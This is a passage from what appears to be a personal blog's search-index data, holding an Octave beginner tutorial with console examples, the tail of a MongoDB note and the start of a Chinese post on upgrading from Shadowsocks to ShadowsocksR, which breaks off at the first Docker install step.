class=\"built_in\">log</span></span><br><span class=\"line\">switched to db <span class=\"built_in\">log</span> </span><br><span class=\"line\">&gt; db.login.<span class=\"function\"><span class=\"title\">find</span></span>()</span><br><span class=\"line\">&#123; <span class=\"string\">&quot;_id&quot;</span> : ObjectId(<span class=\"string\">&quot;5ddbd169eb6a4cd920e6a7a2&quot;</span>), <span class=\"string\">&quot;loginName&quot;</span> : <span class=\"string\">&quot;xuranus&quot;</span>, <span class=\"string\">&quot;loginTime&quot;</span> : 1574687081000 &#125;</span><br></pre></td></tr></table></figure><br><strong>不能使用let声明变量,一定要用var！</strong></p>\n<p>技术胖 P5开始-》</p>\n","tags":["数据库","MongoDB"]},{"title":"Octave Language Learning","url":"/2019/11/26/octave%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<p>Octave为GNU项目下的开源软件,可以快速实现算法的一种原型语言。在线Web地址：</p>\n<p>Octave is a free open source software under the GNU prject,which can rapidly implement algorithm. </p>\n<p>Online version: <a href=\"https://octave-online.net/\">octave-online</a></p>\n<p>Installation on Archlinux：<code>sudo pacman -S octave</code>,enter the shell：<code>octave</code>,shows the following:</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GNU Octave, version 5.1.0</span><br><span class=\"line\">Copyright (C) 2019 John W. Eaton and others.</span><br><span class=\"line\">This is free software; see the source code for copying conditions.</span><br><span class=\"line\">There is ABSOLUTELY NO WARRANTY; not even for MERCHANTABILITY or</span><br><span class=\"line\">FITNESS FOR A PARTICULAR PURPOSE.  For details, type &#x27;warranty&#x27;.</span><br><span class=\"line\"></span><br><span class=\"line\">Octave was configured for &quot;x86_64-pc-linux-gnu&quot;.</span><br><span class=\"line\"></span><br><span class=\"line\">Additional information about Octave is available at https://www.octave.org.</span><br><span class=\"line\"></span><br><span class=\"line\">Please contribute if you find this software useful.</span><br><span class=\"line\">For more information, visit https://www.octave.org/get-involved.html</span><br><span class=\"line\"></span><br><span class=\"line\">Read https://www.octave.org/bugs.html to learn how to submit bug reports.</span><br><span class=\"line\">For information about changes from previous versions, type &#x27;news&#x27;.</span><br><span class=\"line\"></span><br><span class=\"line\">octave:1&gt; </span><br></pre></td></tr></table></figure>\n<h2 id=\"Basic-opeation\"><a href=\"#Basic-opeation\" class=\"headerlink\" title=\"Basic opeation\"></a>Basic opeation</h2><h3 id=\"common-variables\"><a href=\"#common-variables\" class=\"headerlink\" title=\"common variables\"></a>common variables</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">octave:5&gt; 1+1</span><br><span class=\"line\">ans =  2</span><br><span class=\"line\">octave:6&gt; 3-6</span><br><span class=\"line\">ans = -3</span><br><span class=\"line\">octave:7&gt; 5*3</span><br><span class=\"line\">ans =  15</span><br><span class=\"line\">octave:8&gt; 4/5</span><br><span class=\"line\">ans =  0.80000</span><br><span class=\"line\">octave:9&gt; 1==2 %false</span><br><span class=\"line\">ans = 0</span><br><span class=\"line\">octave:10&gt; 1==1 %true</span><br><span class=\"line\">ans = 1</span><br><span class=\"line\">octave:11&gt; 1 &amp;&amp; 0 % AND</span><br><span class=\"line\">ans = 0</span><br><span class=\"line\">octave:12&gt; 1 || 0 % OR</span><br><span class=\"line\">ans = 1</span><br></pre></td></tr></table></figure>\n<p>use <code>PS1()</code> to change the default prompt:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">octave:14&gt; PS1(&#x27;( つ•̀ω•́)つ &#x27;)</span><br><span class=\"line\">( つ•̀ω•́)つ A = [1,2,3;4,5,6;7,8,9]</span><br><span class=\"line\">A =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2   3</span><br><span class=\"line\">   4   5   6</span><br><span class=\"line\">   7   8   9</span><br><span class=\"line\">( つ•̀ω•́)つ PS1(&#x27;&gt;&gt;&#x27;)</span><br><span class=\"line\">&gt;&gt;</span><br></pre></td></tr></table></figure></p>\n<p>semicolon supress output<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; a = 3</span><br><span class=\"line\">a =  3</span><br><span class=\"line\">&gt;&gt; a = 3;</span><br><span class=\"line\">&gt;&gt; a</span><br><span class=\"line\">a = 3</span><br><span class=\"line\">&gt;&gt; a;</span><br></pre></td></tr></table></figure></p>\n<p><code>disp()</code> is used to display,<code>sprintf()</code> is used to format string output:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;pi = 3.1415926;</span><br><span class=\"line\">&gt;&gt;disp(pi)</span><br><span class=\"line\"> 3.1416</span><br><span class=\"line\">&gt;&gt;disp(sprintf(&#x27;pi is: %0.2f&#x27;,pi))</span><br><span class=\"line\">pi is: 3.14</span><br></pre></td></tr></table></figure><br><code>format [long|short]</code> is used to change the precision.</p>\n<h3 id=\"matrix-and-vector\"><a href=\"#matrix-and-vector\" class=\"headerlink\" title=\"matrix and vector\"></a>matrix and vector</h3><p>A is a 3x2 matrix,x is a 3x1 vector,y is a 1x3 vector.<br><code>ones()</code> returns a matrix with all elements 1.<br><code>zeros()</code> returns a matrix with all elements 0.<br><code>rand()</code> returns a matrix with all elements random number.<br><code>eye()</code> returns a identity matrix.<br><code>size()</code> returns the size of the matrix.<br><code>length()</code> returns the larger dimension of the matrix,for vector it returns the length of it.<br><code>A(x,y)</code> returns the <code>A[x][y]</code> element.<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;A = [1,2,3;4,5,6]</span><br><span class=\"line\">A =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2   3</span><br><span class=\"line\">   4   5   6</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;A(1,3)</span><br><span class=\"line\">ans =  3</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;A(2,:) % means every element along that column/row</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   4   5   6</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;A(:,[1,2])</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2</span><br><span class=\"line\">   4   5</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;size(A)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   2   3</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;x = [3;4;5]</span><br><span class=\"line\">x =</span><br><span class=\"line\"></span><br><span class=\"line\">   3</span><br><span class=\"line\">   4</span><br><span class=\"line\">   5</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;y = [1,2,3]</span><br><span class=\"line\">y =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2   3</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;v = 1:6 </span><br><span class=\"line\">v =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2   3   4   5   6</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;v = [1 2 3 4]</span><br><span class=\"line\">v =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2   3   4</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;length(A)</span><br><span class=\"line\">ans =  3</span><br><span class=\"line\">&gt;&gt;length(v)</span><br><span class=\"line\">ans =  4</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;ones(2,3)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   1   1</span><br><span class=\"line\">   1   1   1</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;eye(3)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">Diagonal Matrix</span><br><span class=\"line\"></span><br><span class=\"line\">   1   0   0</span><br><span class=\"line\">   0   1   0</span><br><span class=\"line\">   0   0   1</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;A = [A,[7;8]] % append a column to matrix</span><br><span class=\"line\">A =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2   3   7</span><br><span class=\"line\">   4   5   6   8</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;A(:) % put all elements of A into a single vector</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   1</span><br><span class=\"line\">   4</span><br><span class=\"line\">   2</span><br><span class=\"line\">   5</span><br><span class=\"line\">   3</span><br><span class=\"line\">   6</span><br><span class=\"line\">   7</span><br><span class=\"line\">   8</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;A = [A;[9,10,11,12]] % append a row to the matrix</span><br><span class=\"line\">A =</span><br><span class=\"line\"></span><br><span class=\"line\">    1    2    3    7</span><br><span class=\"line\">    4    5    6    8</span><br><span class=\"line\">    1    2    3    4</span><br><span class=\"line\">    9   10   11   12</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>use <code>hist()</code> to plot a histogram<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;w = randn(1,10000)</span><br><span class=\"line\">&gt;&gt;hist(w)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Data-Persist\"><a href=\"#Data-Persist\" class=\"headerlink\" title=\"Data Persist\"></a>Data Persist</h2><p>use <code>help &lt;cmd&gt;</code> to refer to the manual of cmd<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;help eye</span><br><span class=\"line\">&gt;&gt;help rand</span><br></pre></td></tr></table></figure></p>\n<p>use <code>pwd</code> to get present working directory,use <code>cd</code> to change directory,<code>ls</code> to list the files:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;pwd</span><br><span class=\"line\">ans = /home/xuranus</span><br><span class=\"line\">&gt;&gt;cd ~/Desktop/</span><br><span class=\"line\">&gt;&gt;pwd</span><br><span class=\"line\">ans = /home/xuranus/Desktop</span><br></pre></td></tr></table></figure></p>\n<p>use <code>who</code> to list all the variable in current working space while <code>whos</code> list the detail. <code>save(filename)</code> can save all the data to the disk,when the second variable is speified like <code>save(&#39;xxx&#39;,v)</code>,only the specified variable v will be persisted .<code>clear</code> can clear all the data,and then we use <code>who</code>again to check if there exists any variable(of course there doesn’t).By using <code>load(filename)</code> we can restore the variable we cleared from file.<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;who</span><br><span class=\"line\">Variables in the current scope:</span><br><span class=\"line\">A    a    ans  p    pi   v    w    x    y</span><br><span class=\"line\">&gt;&gt;save(&#x27;test1.dat&#x27;)</span><br><span class=\"line\">&gt;&gt;ls</span><br><span class=\"line\">test.dat</span><br><span class=\"line\">&gt;&gt;clear</span><br><span class=\"line\">&gt;&gt;who</span><br><span class=\"line\">&gt;&gt;load(&#x27;test1.dat&#x27;)</span><br><span class=\"line\">&gt;&gt;whos</span><br><span class=\"line\">Variables in the current scope:</span><br><span class=\"line\"></span><br><span class=\"line\">   Attr Name        Size                     Bytes  Class</span><br><span class=\"line\">   ==== ====        ====                     =====  ===== </span><br><span class=\"line\">        A           2x3                         48  double</span><br><span class=\"line\">        a           1x1                          8  double</span><br><span class=\"line\">        ans         1x21                        21  char</span><br><span class=\"line\">        p           3x1                         24  double</span><br><span class=\"line\">        pi          1x1                          8  double</span><br><span class=\"line\">        v           1x4                         32  double</span><br><span class=\"line\">        w           1x10000                  80000  double</span><br><span class=\"line\">        x           3x1                         24  double</span><br><span class=\"line\">        y           1x3                         24  double</span><br><span class=\"line\"></span><br><span class=\"line\">Total is 10042 elements using 80189 bytes</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Computing-On-Data\"><a href=\"#Computing-On-Data\" class=\"headerlink\" title=\"Computing On Data\"></a>Computing On Data</h2><p><code>.</code> denotes element wise operation,which is different from common matrix arthmetic operation.<br><code>pinv()</code> returns the reverse of A.<br><code>A&#39;</code> means transpose of matrix A.<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; A = [1 2; 3 4; 5 6]</span><br><span class=\"line\">A =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2</span><br><span class=\"line\">   3   4</span><br><span class=\"line\">   5   6</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; B = [4 5 6;7 8 9]</span><br><span class=\"line\">B =</span><br><span class=\"line\"></span><br><span class=\"line\">   4   5   6</span><br><span class=\"line\">   7   8   9</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; A&#x27;</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   3   5</span><br><span class=\"line\">   2   4   6</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; A*B</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   18   21   24</span><br><span class=\"line\">   40   47   54</span><br><span class=\"line\">   62   73   84</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; A.*B</span><br><span class=\"line\">error: product: nonconformant arguments (op1 is 3x2, op2 is 2x3)</span><br><span class=\"line\">&gt;&gt;&gt; C = [6 7 8;9 10 11]</span><br><span class=\"line\">C =</span><br><span class=\"line\"></span><br><span class=\"line\">    6    7    8</span><br><span class=\"line\">    9   10   11</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; B.*C</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   24   35   48</span><br><span class=\"line\">   63   80   99</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; B./C</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   0.66667   0.71429   0.75000</span><br><span class=\"line\">   0.77778   0.80000   0.81818</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; B.+C</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   10   12   14</span><br><span class=\"line\">   16   18   20</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; A.^2 % element-wise square</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">    1    4</span><br><span class=\"line\">    9   16</span><br><span class=\"line\">   25   36</span><br></pre></td></tr></table></figure><br>when a single parameter function applied to vector or matrix, it performs an element-wise operation.<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; v = 1:6</span><br><span class=\"line\">v =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2   3   4   5   6</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; log(v)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   0.00000   0.69315   1.09861   1.38629   1.60944   1.79176</span><br></pre></td></tr></table></figure><br>the use of <code>max(vector)</code>:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; A</span><br><span class=\"line\">A =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2</span><br><span class=\"line\">   3   4</span><br><span class=\"line\">   5   6</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt; v = 1:6</span><br><span class=\"line\">v =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   2   3   4   5   6</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt; max(v) % return the maximum number</span><br><span class=\"line\">ans =  6</span><br><span class=\"line\">&gt;&gt; [num,index] = max(v) % return the maximum number and corresponding index</span><br><span class=\"line\">num =  6</span><br><span class=\"line\">index =  6</span><br><span class=\"line\">&gt;&gt; max(A)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   5   6</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt; v&gt;3 % return each element is larger than 3 or not</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">  0  0  0  1  1  1</span><br><span class=\"line\"></span><br><span class=\"line\">octave:10&gt; find(v&gt;3) % filter the element larger than 3</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   4   5   6</span><br></pre></td></tr></table></figure><br><code>magic()</code> returns a nxn matrix whose row, column, diagnoal add up to the same thing.<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; magic(3)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   8   1   6</span><br><span class=\"line\">   3   5   7</span><br><span class=\"line\">   4   9   2</span><br></pre></td></tr></table></figure></p>\n<p><code>prod()</code> returns the product of vector.<br><code>sum()</code> return the sum of the vector.<br><code>ceil()</code> means get rounded up while <code>floor()</code> means get rounded down.<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; v = [1 6 4 3.5]</span><br><span class=\"line\">v =</span><br><span class=\"line\"></span><br><span class=\"line\">   1.0000   6.0000   4.0000   3.5000</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; prod(v) </span><br><span class=\"line\">ans =  84</span><br><span class=\"line\">&gt;&gt;&gt; sum(v)</span><br><span class=\"line\">ans =  14.500</span><br><span class=\"line\">&gt;&gt;&gt; floor(v)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   6   4   3</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; ceil(v)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   1   6   4   4</span><br></pre></td></tr></table></figure></p>\n<p><code>max(A1,A2)</code> returns a new matrix ,every element of which is the larger one.<br><code>max(A,[],1)</code> compares the first dimension(the column) and returns a vector ,the ith element is the maximum in the ith column.<br>if you need to find the maximum number in A,you can type <code>max(max(A))</code> or <code>max(A(:))</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; A = magic(3)</span><br><span class=\"line\">A =</span><br><span class=\"line\"></span><br><span class=\"line\">   8   1   6</span><br><span class=\"line\">   3   5   7</span><br><span class=\"line\">   4   9   2</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; B = A&#x27;</span><br><span class=\"line\">B =</span><br><span class=\"line\"></span><br><span class=\"line\">   8   3   4</span><br><span class=\"line\">   1   5   9</span><br><span class=\"line\">   6   7   2</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; max(A,B)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   8   3   6</span><br><span class=\"line\">   3   5   9</span><br><span class=\"line\">   6   9   2</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; max(A,[],1)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   8   9   7</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; max(A,[],2)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   8</span><br><span class=\"line\">   7</span><br><span class=\"line\">   9</span><br></pre></td></tr></table></figure><br><code>sum(A)</code> and <code>sum(A,1)</code> returns the sum of each column in matrix A.<br><code>sum(A,2)</code> return the sum of each row in matrix.<br>if we need to calculate sum of all elements in A, we can use <code>sum(sum(A))</code> or <code>sum(A(:))</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; A</span><br><span class=\"line\">A =</span><br><span class=\"line\"></span><br><span class=\"line\">   17   24    1    8   15</span><br><span class=\"line\">   23    5    7   14   16</span><br><span class=\"line\">    4    6   13   20   22</span><br><span class=\"line\">   10   12   19   21    3</span><br><span class=\"line\">   11   18   25    2    9</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; sum(A)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   65   65   65   65   65</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; sum(A,1)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   65   65   65   65   65</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;&gt; sum(A,2)</span><br><span class=\"line\">ans =</span><br><span class=\"line\"></span><br><span class=\"line\">   65</span><br><span class=\"line\">   65</span><br><span class=\"line\">   65</span><br><span class=\"line\">   65</span><br><span class=\"line\">   65</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Plotting-Data\"><a href=\"#Plotting-Data\" class=\"headerlink\" title=\"Plotting Data\"></a>Plotting Data</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; t = [0:0.01:0.98]; % vector t from 0 - 0.98 step 0.01</span><br><span class=\"line\">&gt;&gt; y = sin(2*pi*4*t); % vector y</span><br><span class=\"line\">&gt;&gt; plot(t,y)</span><br><span class=\"line\">&gt;&gt; close % close the plotting window</span><br></pre></td></tr></table></figure>\n<p><img src=\"Screenshot_20191126_174816.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; t = [0:0.01:0.98]; % vector t from 0 - 0.98 step 0.01</span><br><span class=\"line\">&gt;&gt; y1 = sin(2*pi*4*t); % vector y</span><br><span class=\"line\">&gt;&gt; plot(t,y1);</span><br><span class=\"line\">&gt;&gt; hold on % wait for another plot</span><br><span class=\"line\">&gt;&gt; y2 = cos(2*pi*4*t);</span><br><span class=\"line\">&gt;&gt; plot(t,y2)</span><br><span class=\"line\">&gt;&gt; ylabel(&#x27;value&#x27;)</span><br><span class=\"line\">&gt;&gt; xlabel(&#x27;time&#x27;)</span><br><span class=\"line\">&gt;&gt; legend(&#x27;sin&#x27;,&#x27;cos&#x27;) % legend</span><br><span class=\"line\">&gt;&gt; title(&#x27;my plot&#x27;)</span><br><span class=\"line\">&gt;&gt; print -dpng &#x27;myplot.png&#x27; % save to file</span><br><span class=\"line\">&gt;&gt; close</span><br></pre></td></tr></table></figure>\n<p><img src=\"Screenshot_20191126_175626.png\" alt=\"\"></p>\n<p>if you want to plot figure in mutiple windows:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; figure(1);plot(t,y1);</span><br><span class=\"line\">&gt;&gt; figure(2);plot(t,y2);</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; subplot(1,2,1) % divides plot a 1x2 grid,acesss the 1st element</span><br><span class=\"line\">&gt;&gt; plot(t,y1)</span><br><span class=\"line\">&gt;&gt; subplot(1,2,2)</span><br><span class=\"line\">&gt;&gt; plot(t,y2)</span><br><span class=\"line\">&gt;&gt; axis([0.5 1 -1 1])</span><br></pre></td></tr></table></figure>\n<p><img src=\"Screenshot_20191126_194545.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; A = magic(5)</span><br><span class=\"line\">A =</span><br><span class=\"line\"></span><br><span class=\"line\">   17   24    1    8   15</span><br><span class=\"line\">   23    5    7   14   16</span><br><span class=\"line\">    4    6   13   20   22</span><br><span class=\"line\">   10   12   19   21    3</span><br><span class=\"line\">   11   18   25    2    9</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt; imagesc(A)</span><br><span class=\"line\">&gt;&gt; imagesc(A),colorbar,colormap gray % comma chaining of function call</span><br></pre></td></tr></table></figure>\n<p><img src=\"Screenshot_20191126_194645.png\" alt=\"\"><br><img src=\"Screenshot_20191126_194901.png\" alt=\"\"></p>\n<h2 id=\"Control-Statement\"><a href=\"#Control-Statement\" class=\"headerlink\" title=\"Control Statement\"></a>Control Statement</h2><h3 id=\"for\"><a href=\"#for\" class=\"headerlink\" title=\"for\"></a>for</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; v = 1:10</span><br><span class=\"line\">&gt;&gt; for i=1:10,</span><br><span class=\"line\">&gt;   v(i) = 2^i;</span><br><span class=\"line\">&gt; end;</span><br><span class=\"line\">&gt;&gt; v</span><br><span class=\"line\">v =</span><br><span class=\"line\">      2      4      8     16     32     64    128    256    512   1024</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">v = zeros(10, 1);</span><br><span class=\"line\">for i = 1:10</span><br><span class=\"line\">  for j = 1:10</span><br><span class=\"line\">    v(i) = v(i) + A(i, j) * x(j);</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure>\n<h3 id=\"while\"><a href=\"#while\" class=\"headerlink\" title=\"while\"></a>while</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; v = 1:10</span><br><span class=\"line\">&gt;&gt; while i&lt;=5,</span><br><span class=\"line\">&gt;   v(i) = 100</span><br><span class=\"line\">&gt;   i = i+1;</span><br><span class=\"line\">&gt; end;</span><br><span class=\"line\">&gt;&gt; v</span><br><span class=\"line\">v = </span><br><span class=\"line\">    100    100    100    100    100     6    7    8    9   10</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; v = 1:10</span><br><span class=\"line\">&gt;&gt; while true,</span><br><span class=\"line\">&gt;    v(i) = 100</span><br><span class=\"line\">&gt;    i = i+1;</span><br><span class=\"line\">&gt;    if i == 6,</span><br><span class=\"line\">&gt;      break;</span><br><span class=\"line\">&gt;    end;</span><br><span class=\"line\">&gt; end;</span><br><span class=\"line\">&gt;&gt; v</span><br><span class=\"line\">v = </span><br><span class=\"line\">    100    100    100    100    100     6    7    8    9   10</span><br></pre></td></tr></table></figure>\n<h3 id=\"if\"><a href=\"#if\" class=\"headerlink\" title=\"if\"></a>if</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; v = 1:10</span><br><span class=\"line\">v =</span><br><span class=\"line\"></span><br><span class=\"line\">    1    2    3    4    5    6    7    8    9   10</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt; if v(1)==1,</span><br><span class=\"line\">&gt;   disp(&#x27;value is one&#x27;);</span><br><span class=\"line\">&gt; elseif v(1)==2,</span><br><span class=\"line\">&gt;   disp(&#x27;value is two&#x27;);</span><br><span class=\"line\">&gt; end;</span><br><span class=\"line\">value is one</span><br></pre></td></tr></table></figure>\n<h2 id=\"functions\"><a href=\"#functions\" class=\"headerlink\" title=\"functions\"></a>functions</h2><p>define a octave function and write to file <code>squareAndCube.m</code> (function name must correspond to filename):<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">function [y1,y2] = squareAndCube(x)</span><br><span class=\"line\"></span><br><span class=\"line\">y1 = x^2;</span><br><span class=\"line\">y2 = x^3;</span><br><span class=\"line\"></span><br><span class=\"line\">end;</span><br></pre></td></tr></table></figure><br>enter the octave shell:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; addpath(&#x27;path to the file&#x27;)</span><br><span class=\"line\">&gt;&gt; squareAndCube(4)</span><br><span class=\"line\">ans =  16</span><br></pre></td></tr></table></figure></p>\n","tags":["数据科学"]},{"title":"ss升级ssr","url":"/2017/10/12/ss%E5%8D%87%E7%BA%A7ssr/","content":"<h2 id=\"Shadowsocks-不安全\"><a href=\"#Shadowsocks-不安全\" class=\"headerlink\" title=\"Shadowsocks 不安全\"></a>Shadowsocks 不安全</h2><p>深圳正在利用精准SS协议识别技术查禁VPN上网,查到有使用VPN行为就停宽带，写了保证书才给恢复宽带。运营商直接从源头监控你网络接入的情况。任何浏览的网址和数据都被监控，翻墙的事情也就显而易见。</p>\n<h2 id=\"SSR-成为新宠\"><a href=\"#SSR-成为新宠\" class=\"headerlink\" title=\"SSR 成为新宠\"></a>SSR 成为新宠</h2><p>SSR版本的出现，改变了SS单纯的TCP发包模式，利用UDP和TCP转换，将协议流量特征降到最低，同时混淆及自定义协议接口，将流量变成隐性且不易察觉，特别是后期redirect参数，甚至可以将Twitter的流量伪装成bing的流量发包传输，整体来说SSR版本后期定制性不可小觑。</p>\n<h3 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h3><p>全能代理，同一端口支持socks4/socks4a/socks5/http<br>节点统计，包括延迟、连接数、当前下载速度、最高速度、出错率等等<br>连接管理，随时断开指定节点的连接，或修改节点后自动断开<br>协议转换，把UDP包封装于TCP里发送<br>多重代理，通过设置前置socks5/http代理，可达到任意重代理<br>协议插件，支持自定义协议和协议混淆</p>\n<span id=\"more\"></span>\n<h3 id=\"SSR-官网介绍：\"><a href=\"#SSR-官网介绍：\" class=\"headerlink\" title=\"SSR 官网介绍：\"></a>SSR 官网介绍：</h3><p>这里是ShadowsocksR的非常简陋的辣鸡主页。本软件是很少人知道的网络减速器，专门通过奇怪的加密和协议，让你机器跑满CPU，以便让更多人享受龟爬般的网络，感受进度条永远卡在99%的快感。</p>\n<h3 id=\"SSR-服务端\"><a href=\"#SSR-服务端\" class=\"headerlink\" title=\"SSR 服务端\"></a>SSR 服务端</h3><p>使用 docker 可以最快速地完成安装。</p>\n<ol>\n<li>安装 docker 和启动 docker</li>\n</ol>\n<h4 id=\"centos-系统\"><a href=\"#centos-系统\" class=\"headerlink\" title=\"centos 系统\"></a>centos 系统</h4><p><code>yum update &amp;&amp; yum install -y docker &amp;&amp; systemctl start docker</code></p>\n<h4 